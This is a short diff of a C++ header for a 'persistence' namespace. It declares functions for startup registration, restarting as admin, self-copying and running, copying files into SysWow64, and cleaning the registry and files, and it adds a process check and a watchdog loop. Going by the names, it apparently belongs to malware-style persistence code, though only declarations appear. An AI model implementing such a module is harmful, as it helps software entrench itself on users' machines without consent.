@@ -9,12 +9,14 @@ void addToStartup();
 void reset();
 void restartSystem();
 void restartAsAdmin();
-bool copyAndRunSelf();
+int copyAndRunSelf();
 void cleanreg();
 void cleanfile();
 std::string getDiskSerial();
 void CopyFileToSysWow64(std::string destPath, std::string filename);
 void StopExe();
+bool isProcessRunning(const char* exeName);
+void watchdogLoop();
 
 } // namespace persistence
 
